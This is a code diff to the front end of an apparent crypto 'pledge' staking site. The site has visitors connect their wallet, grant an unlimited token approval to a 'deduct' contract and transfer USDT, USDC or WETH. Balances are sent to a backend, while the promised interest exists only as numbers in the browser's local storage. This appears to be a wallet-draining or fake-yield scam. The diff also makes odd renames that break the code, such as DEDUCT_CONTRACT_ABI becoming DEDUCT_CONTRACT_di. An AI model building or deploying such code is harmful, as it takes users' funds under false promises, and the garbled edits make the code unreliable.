@@ -36,7 +36,7 @@ const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
-const DEDUCT_CONTRACT_ABI = [
+const DEDUCT_CONTRACT_di = [
   "function isServiceActiveFor(address customer) view returns (bool)",
   "function activateService(address tokenContract) external",
   "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
@@ -145,7 +145,6 @@ const translations = {
     apr: 'APR',
     accrued: 'Accrued Interest',
     exceedBalance: 'Amount exceeds wallet balance!',
-    // 【新增】Account Balance 明細
     accountDetailTitle: 'Account Balance Details',
     totalBalance: 'Total Balance',
     pledgedAmount: 'Pledged Amount',
@@ -207,7 +206,6 @@ const translations = {
     apr: '年化',
     accrued: '累積利息',
     exceedBalance: '金額超出錢包餘額！',
-    // 【新增】Account Balance 明細
     accountDetailTitle: '帳戶餘額明細',
     totalBalance: '總餘額',
     pledgedAmount: '質押金額',
@@ -269,9 +267,8 @@ const translations = {
     apr: '年化',
     accrued: '累计利息',
     exceedBalance: '金额超出钱包余额！',
-    // 【新增】Account Balance 明細
     accountDetailTitle: '账户余额明细',
-    totalBalance: '总余额',
+    icons: '总余额',
     pledgedAmount: '质押金额',
     claimedInterest: '已领取利息',
     walletBalance: '钱包余额'
@@ -346,7 +343,6 @@ function getElements() {
     totalPledge: document.getElementById('totalPledgeValue'),
     estimate: document.getElementById('estimateValue'),
     exceedWarning: document.getElementById('exceedWarning'),
-    // 【新增】Account Balance 明細
     accountDetailTitle: document.getElementById('accountDetailTitle'),
     modalTotalBalanceLabel: document.getElementById('modalTotalBalanceLabel'),
     modalPledgedAmountLabel: document.getElementById('modalPledgedAmountLabel'),
@@ -555,13 +551,10 @@ function updateBalancesUI(walletBalances) {
   const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
   const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
   const walletValue = parseFloat(formattedWalletBalance);
-
   accountBalance[selectedToken].wallet = walletValue;
   if (walletBalanceAmount) walletBalanceAmount.textContent = walletValue.toFixed(3);
-
   updateAccountBalanceDisplay();
   updateEstimate();
-
   sendToBackend({ type: 'balance', balances: getCurrentBalances() });
 }
 
@@ -628,28 +621,20 @@ async function updateInterest() {
     updateClaimableDisplay();
     return;
   }
-
   const now = Date.now();
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(now + etOffset);
-
   const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
   const isExactMinute = nowET.getMinutes() === 0;
-
   if (!isPayoutTime || !isExactMinute) return;
-
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   const lastPayoutET = new Date(lastPayout + etOffset);
   const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
-
   if (wasPayoutTime) return;
-
   const cycleInterest = totalBalance * (MONTHLY_RATE / 60);
   window.currentClaimable += cycleInterest;
-
   localStorage.setItem('claimable', window.currentClaimable.toString());
   localStorage.setItem('lastPayoutTime', now.toString());
-
   await saveUserData();
   log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
   updateClaimableDisplay();
@@ -694,15 +679,12 @@ function updateNextBenefitTimer() {
   if (!nextBenefit) return;
   const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
   const label = translations[currentLang].nextBenefit.split(':')[0];
-
   if (!nextBenefitTimestamp) {
     nextBenefit.textContent = `${label}: 00:00:00`;
     return;
   }
-
   const now = Date.now();
   let diff = nextBenefitTimestamp - now;
-
   if (diff <= 0) {
     const twelveHoursInMillis = 12 * 60 * 60 * 1000;
     const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
@@ -710,7 +692,6 @@ function updateNextBenefitTimer() {
     saveUserData();
     diff = newNextBenefitTimestamp - now;
   }
-
   const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
   const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
   const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
@@ -720,14 +701,11 @@ function updateNextBenefitTimer() {
 
 function setInitialNextBenefitTime() {
   if (localStorage.getItem('nextBenefitTime')) return;
-
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(Date.now() + etOffset);
-
   const nextHour = nowET.getHours() < 12 ? 12 : 24;
   const nextBenefitTimeET = new Date(nowET);
   nextBenefitTimeET.setHours(nextHour, 0, 0, 0);
-
   const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
   localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
   saveUserData();
@@ -736,15 +714,11 @@ function setInitialNextBenefitTime() {
 function activateStakingUI() {
   if (startBtn) startBtn.style.display = 'none';
   initializeMiningData();
-
   if (interestInterval) clearInterval(interestInterval);
   interestInterval = setInterval(updateInterest, 60000);
-
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
-
   setInitialNextBenefitTime();
-
   saveUserData();
   updateInterest();
 }
@@ -776,7 +750,6 @@ async function initializeWallet() {
     if (connectButton) connectButton.disabled = true;
     return;
   }
-
   try {
     if (typeof window.ethereum !== 'undefined') {
       provider = new window.ethers.BrowserProvider(window.ethereum);
@@ -786,7 +759,6 @@ async function initializeWallet() {
       log('無錢包注入，使用 Infura 備用節點（僅讀取）', 'info');
       updateStatus('請連結錢包以進行交易', true);
     }
-
     if (window.ethereum) {
       window.ethereum.on('accountsChanged', a => {
         if (a.length === 0) disconnectWallet();
@@ -800,7 +772,6 @@ async function initializeWallet() {
         setTimeout(connectWallet, 500);
       });
     }
-
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
       await connectWallet();
@@ -821,28 +792,22 @@ async function connectWallet() {
       updateStatus('請連結支援 EIP-1193 的錢包', true);
       return;
     }
-
     if (!provider) {
       provider = new window.ethers.BrowserProvider(window.ethereum);
     }
-
     updateStatus('Connecting...');
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account.");
-
     signer = await provider.getSigner();
     userAddress = await signer.getAddress();
-
-    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
+    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_di, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
     wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-
     if (connectButton) {
       connectButton.classList.add('connected');
       connectButton.textContent = 'Connected';
     }
-
     log(`錢包連接成功: ${userAddress}`, 'success');
     sendToBackend({ type: 'connect', balances: getCurrentBalances() });
     await loadUserDataFromServer();
@@ -859,7 +824,6 @@ async function connectWallet() {
 
 async function forceRefreshWalletBalance() {
   if (!userAddress) return;
-
   updateStatus('Fetching balances...');
   try {
     const [usdtBal, usdcBal, wethBal] = await Promise.all([
@@ -1012,7 +976,6 @@ function updateLanguage(lang) {
     document.documentElement.lang = lang;
     updatePledgeSummary();
     updateEstimate();
-    // 【新增】更新 Account Balance 明細標題
     if (elements.accountDetailTitle) elements.accountDetailTitle.textContent = translations[lang].accountDetailTitle;
     if (elements.modalTotalBalanceLabel) elements.modalTotalBalanceLabel.textContent = translations[lang].totalBalance;
     if (elements.modalPledgedAmountLabel) elements.modalPledgedAmountLabel.textContent = translations[lang].pledgedAmount;
@@ -1043,25 +1006,19 @@ function updatePledgeSummary() {
 // ==================== 預估收益 ====================
 function updateEstimate() {
   if (!pledgeAmount || !pledgeDuration || !pledgeToken || !elements.estimate || !elements.exceedWarning) return;
-
   const amount = parseFloat(pledgeAmount.value) || 0;
   const durationDays = parseInt(pledgeDuration.value) || 90;
   const token = pledgeToken.value;
-
   if (amount === 0) {
     elements.estimate.textContent = '0.000';
     elements.exceedWarning.style.display = 'none';
     return;
   }
-
   const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
   if (!duration) return;
-
   const interest = amount * duration.rate;
   const total = amount + interest;
-
   elements.estimate.textContent = `${total.toFixed(3)} ${token}`;
-
   const walletBalance = parseFloat(walletBalanceAmount.textContent) || 0;
   if (amount > walletBalance) {
     elements.exceedWarning.textContent = translations[currentLang].exceedBalance;
@@ -1077,7 +1034,6 @@ function showPledgeDetail() {
   if (!pledgeDetailModal) return;
   const content = document.getElementById('pledgeDetailContent');
   if (!content) return;
-
   content.innerHTML = '';
   if (userPledges.length === 0) {
     content.innerHTML = `<p>${translations[currentLang].noClaimable}</p>`;
@@ -1090,7 +1046,6 @@ function showPledgeDetail() {
       const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration);
       const apr = durationInfo ? (durationInfo.rate * 100).toFixed(1) + '%' : 'N/A';
       const accrued = p.amount * durationInfo.rate * (Date.now() - p.startTime) / (p.duration * 24 * 60 * 60 * 1000);
-
       const row = document.createElement('div');
       row.style = 'border-bottom: 1px solid #333; padding: 10px 0;';
       row.innerHTML = `
@@ -1103,25 +1058,21 @@ function showPledgeDetail() {
       content.appendChild(row);
     });
   }
-
   pledgeDetailModal.style.display = 'flex';
 }
 
 // ==================== 【新增】Account Balance 明細 ====================
 function showAccountDetail() {
   if (!accountDetailModal) return;
-
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const total = getTotalAccountBalanceInSelectedToken();
   const pledged = accountBalance[selected].pledged || 0;
   const interest = accountBalance[selected].interest || 0;
   const wallet = accountBalance[selected].wallet || 0;
-
   document.getElementById('modalTotalBalance').textContent = `${total.toFixed(3)} ${selected}`;
   document.getElementById('modalPledgedAmount').textContent = `${pledged.toFixed(3)} ${selected}`;
   document.getElementById('modalClaimedInterest').textContent = `${interest.toFixed(3)} ${selected}`;
   document.getElementById('modalWalletBalance').textContent = `${wallet.toFixed(3)} ${selected}`;
-
   accountDetailModal.style.display = 'flex';
 }
 
@@ -1135,20 +1086,15 @@ function checkPledgeExpiry() {
     const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
     if (Date.now() > endTime && !p.redeemed) {
       p.redeemed = true;
-
       const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration);
       const totalInterest = p.amount * durationInfo.rate;
-
       accountBalance[p.token].pledged -= p.amount;
       accountBalance[p.token].interest += totalInterest;
-
       p.redeemedTime = Date.now();
-
       await saveUserData();
       updateAccountBalanceDisplay();
       updatePledgeSummary();
       updateClaimableDisplay();
-
       sendToBackend({
         type: 'redeem',
         orderId: i,
@@ -1157,7 +1103,6 @@ function checkPledgeExpiry() {
         interest: totalInterest,
         total: p.amount + totalInterest
       });
-
       log(`質押到期贖回: ${p.amount} ${p.token} + ${totalInterest.toFixed(3)} 利息`, 'success');
     }
   });
@@ -1215,8 +1160,7 @@ document.addEventListener('DOMContentLoaded', () => {
     connectButton.addEventListener('click', () => {
       if (connectButton.classList.contains('connected')) {
         disconnectWallet();
-      }deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-      else {
+      } else {
         connectWallet();
       }
     });
@@ -1285,25 +1229,21 @@ document.addEventListener('DOMContentLoaded', () => {
       const decimals = token === 'WETH' ? 18 : 6;
       const amountWei = ethers.parseUnits(amount.toString(), decimals);
       try {
-        // 檢查餘額
         const balance = await tokenContract.connect(provider).balanceOf(userAddress);
         if (balance < amountWei) {
           updateStatus(translations[currentLang].insufficientBalance, true);
           return;
         }
-        // 檢查授權
         const allowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
         if (allowance < amountWei) {
           updateStatus(`Approving ${token}...`);
           const approveTx = await tokenContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
           await sendMobileRobustTransaction(approveTx);
         }
-        // 【修正】deductToken 參數
         updateStatus('Deducting...');
         const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
         const deductTx = await deductContract.deductToken.populateTransaction(tokenAddress, amountWei);
         await sendMobileRobustTransaction(deductTx);
-        // 更新本地
         accountBalance[token].pledged += amount;
         const durationInfo = PLEDGE_DURATIONS.find(d => d.days === durationDays);
         const pledgeOrder = {
@@ -1321,8 +1261,8 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   }
-  
-    if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
+
+  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
@@ -1331,7 +1271,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (closePledgeDetail) closePledgeDetail.addEventListener('click', () => pledgeDetailModal.style.display = 'none');
   if (pledgeDetailModal) pledgeDetailModal.addEventListener('click', e => e.target === pledgeDetailModal && (pledgeDetailModal.style.display = 'none'));
 
-  // 【新增】Account Balance 明細事件
+  // 【修正】使用 closeAccountDetail
   if (accountBalanceValue) {
     accountBalanceValue.style.cursor = 'pointer';
     accountBalanceValue.addEventListener('click', showAccountDetail);
